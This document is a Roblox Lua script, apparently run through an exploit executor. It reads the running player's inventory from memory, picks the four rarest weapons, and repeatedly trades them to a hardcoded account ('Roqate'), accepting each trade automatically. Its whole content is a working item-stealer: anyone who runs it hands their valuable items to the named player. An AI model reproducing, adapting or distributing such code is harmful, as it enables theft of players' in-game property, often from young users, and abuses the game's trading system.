local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.3

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- === Find correct inventory ===
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

-- === Collect ONLY top 4 weapons ===
local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then
        warn("❌ Inventory not found!")
        return {}
    end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    -- Sort highest rarity → lowest
    table.sort(candidates, function(a,b) return a.priority < b.priority end)

    -- Take ONLY top 4
    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- === Wait for Trade GUI (Accept/Decline) ===
local function waitForTradeGUI()
    local timeout = os.clock() + 10
    while os.clock() < timeout do
        local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if gui then
            local acceptBtn = gui:FindFirstChild("Accept", true)
            local declineBtn = gui:FindFirstChild("Decline", true)
            if acceptBtn and declineBtn then
                return gui
            end
        end
        task.wait(0.2)
    end
    return nil
end

-- === Wait for "OTHER PLAYER HAS ACCEPTED" ===
local function waitForOtherAccept(gui)
    local timeout = os.clock() + 20
    while os.clock() < timeout do
        for _, obj in ipairs(gui:GetDescendants()) do
            if obj:IsA("TextLabel") and obj.Text:upper():find("OTHER PLAYER HAS ACCEPTED") then
                return true
            end
        end
        task.wait(0.5)
    end
    return false
end

-- === Add exactly 4 weapons ===
local function addWeaponsToTrade()
    local weapons = getTop4Weapons()
    if #weapons == 0 then
        warn("⚠ No valid weapons found!")
        return false
    end

    print("✅ Adding weapons:")
    for _, w in ipairs(weapons) do
        print("   →", w)
        TradeRemotes.OfferItem:FireServer(w, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
    return true
end

-- === Accept trade (no TradeID arg) ===
local function acceptTradeSimple()
    print("✅ Accepting trade (no TradeID)...")
    pcall(function()
        TradeRemotes.AcceptTrade:FireServer()
    end)
end

-- === Full cycle ===
local function doTradeCycle(targetPlayer)
    print("🔄 Sending trade request to", targetPlayer.Name)
    local ok, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not ok then warn("❌ Trade request failed:", err) return end

    -- Wait for GUI to appear
    local gui = waitForTradeGUI()
    if not gui then
        warn("⚠ Trade GUI not opened!")
        return
    end

    -- Add 4 weapons
    if not addWeaponsToTrade() then return end

    -- Accept trade without TradeID
    acceptTradeSimple()

    -- Wait for other player
    print("⏳ Waiting for other player to accept...")
    if waitForOtherAccept(gui) then
        print("✅ aa player accepted, trade complete!")
    else
        warn("⚠ Timeout waiting for other accept!")
    end
end

-- === Main loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER, "...")
    end
    task.wait(TRADE_COOLDOWN)
end
